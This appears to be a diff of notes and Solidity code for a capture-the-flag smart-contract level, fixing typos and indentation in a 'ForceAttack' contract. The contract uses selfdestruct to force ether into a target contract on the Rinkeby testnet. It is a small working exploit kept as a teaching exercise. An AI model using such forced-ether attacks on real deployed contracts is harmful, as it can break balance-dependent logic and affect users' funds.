@@ -2,7 +2,6 @@
 
 Note : selfdestrcut(address) can forcibly send eth to a contract 
 
-
 # Open brownie console with rinkeby testnet
 
 brownie console --network rinkeby
@@ -33,15 +32,15 @@ pragma solidity 0.8.6;
 
 contract ForceAttack {
 
-// reviece functiuon, to send eth to the attack contract
-receive() external payable {
+    // receive function. to send eth to the attack contract
+    receive() external payable {
 
-}
+    }
 
-//when called it will forcibly send eth to the Force Contract
-function destroy(address payable _ForceAddress) external {
+    //when called it will forcibly send eth to the Force Contract
+    function destroy(address payable _ForceAddress) external {
 
-    selfdestruct(_ForceAddress);
+        selfdestruct(_ForceAddress);
     
     }
 }
